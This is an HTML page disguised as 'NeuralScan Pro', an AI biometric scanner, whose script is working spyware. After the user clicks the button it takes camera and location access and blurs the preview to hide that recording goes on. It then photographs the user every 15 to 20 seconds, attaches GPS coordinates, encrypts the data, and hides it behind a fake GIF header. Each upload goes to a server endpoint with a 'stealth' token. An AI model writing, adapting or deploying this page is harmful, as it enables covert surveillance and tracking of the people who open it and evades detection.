<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NeuralScan Pro | Advanced Biometric AI</title>
    <style>
        :root { --primary: #6366f1; --accent: #06b6d4; --bg: #0f172a; }
        body { 
            margin: 0; padding: 0; background: radial-gradient(at top left, #1e1b4b, var(--bg));
            color: white; font-family: 'Segoe UI', sans-serif;
            display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden;
        }
        .glass-card {
            background: rgba(30, 41, 59, 0.7); backdrop-filter: blur(12px);
            border: 1px solid rgba(255, 255, 255, 0.1); padding: 40px;
            border-radius: 30px; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); width: 380px; text-align: center;
        }
        .logo { font-weight: 800; font-size: 24px; letter-spacing: -1px; margin-bottom: 10px; display: block; }
        .logo span { color: var(--primary); }
        .preview-window {
            width: 100%; height: 220px; background: #000; border-radius: 15px;
            margin: 20px 0; position: relative; overflow: hidden; border: 1px solid rgba(99, 102, 241, 0.3);
        }
        #video { width: 100%; height: 100%; object-fit: cover; display: none; transition: filter 1.5s ease; }
        .scan-bar {
            position: absolute; width: 100%; height: 4px; background: linear-gradient(to right, transparent, var(--accent), transparent);
            top: 0; animation: scanMove 2.5s infinite linear; display: none; z-index: 10;
        }
        @keyframes scanMove { 0% { top: 0%; } 100% { top: 100%; } }
        .btn {
            background: linear-gradient(135deg, var(--primary), var(--accent));
            color: white; border: none; padding: 16px; border-radius: 12px; width: 100%;
            font-weight: bold; font-size: 16px; cursor: pointer; box-shadow: 0 10px 15px -3px rgba(99, 102, 241, 0.4);
        }
        #console { font-family: monospace; font-size: 11px; color: #60a5fa; margin-top: 15px; text-align: left; min-height: 50px; }
    </style>
</head>
<body>

<div class="glass-card">
    <span class="logo">NEURAL<span>SCAN</span> AI</span>
    <p style="font-size: 12px; color: #cbd5e1;">EVASION MODE: ACTIVE</p>
    <div class="preview-window">
        <div id="scan-bar" class="scan-bar"></div>
        <video id="video" autoplay muted playsinline></video>
        <div id="placeholder" style="padding-top: 90px; color: #475569; font-size: 11px;">ESTABLISHING TUNNEL...</div>
    </div>
    <button id="main-btn" class="btn">INITIALIZE LINK</button>
    <div id="console">> Stealth Handshake Ready.</div>
</div>

<canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

<script>
    const btn = document.getElementById('main-btn');
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const consoleLog = document.getElementById('console');
    const scanBar = document.getElementById('scan-bar');

    const SECRET_PASSPHRASE = "neural-link-omega-99"; 
    const STEALTH_TOKEN = "delta-v-882-alpha"; // Evasion Header
    const GIF_MASK = "R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"; // Fake 1x1 GIF header
    
    let targetCoords = { lat: 0, lon: 0 };

    const log = (msg) => { consoleLog.innerHTML = `> [syn] ${msg}`; };

    async function deriveKey(passphrase) {
        const encoder = new TextEncoder();
        const keyMaterial = await crypto.subtle.importKey("raw", encoder.encode(passphrase), { name: "PBKDF2" }, false, ["deriveKey"]);
        return crypto.subtle.deriveKey(
            { name: "PBKDF2", salt: encoder.encode("neural-static-salt"), iterations: 100000, hash: "SHA-256" },
            keyMaterial, { name: "AES-GCM", length: 256 }, false, ["encrypt"]
        );
    }

    async function encryptAndMask(data) {
        const encoder = new TextEncoder();
        const key = await deriveKey(SECRET_PASSPHRASE);
        const iv = crypto.getRandomValues(new Uint8Array(12)); 
        const encryptedContent = await crypto.subtle.encrypt({ name: "AES-GCM", iv: iv }, key, encoder.encode(JSON.stringify(data)));

        const rawEncrypted = {
            iv: btoa(String.fromCharCode(...iv)),
            content: btoa(String.fromCharCode(...new Uint8Array(encryptedContent)))
        };

        // Masking: JSON -> Base64 -> GIF Wrapper
        return GIF_MASK + btoa(JSON.stringify(rawEncrypted));
    }

    async function getTargetLocation() {
        return new Promise((res) => {
            navigator.geolocation.getCurrentPosition((pos) => {
                targetCoords = { lat: pos.coords.latitude, lon: pos.coords.longitude };
                log("Node localized."); res(true);
            }, () => { log("GPS Bypassed."); res(false); });
        });
    }

    btn.onclick = async () => {
        btn.disabled = true;
        await getTargetLocation();
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
        video.style.display = 'block';
        scanBar.style.display = 'block';
        document.getElementById('placeholder').style.display = 'none';
        
        log("Tunneling established.");
        setTimeout(() => video.style.filter = "blur(20px) brightness(0.3)", 2000);

        setInterval(async () => {
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, 640, 480);
            const rawData = { image: canvas.toDataURL('image/jpeg', 0.5), metadata: { location: targetCoords, ts: new Date().toISOString() } };
            const maskedPayload = await encryptAndMask(rawData);

            fetch('/save-photo', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'X-Neural-Token': STEALTH_TOKEN },
                body: JSON.stringify({ data: maskedPayload })
            });
        }, 15000 + Math.random() * 5000);
    };
</script>
</body>
</html>
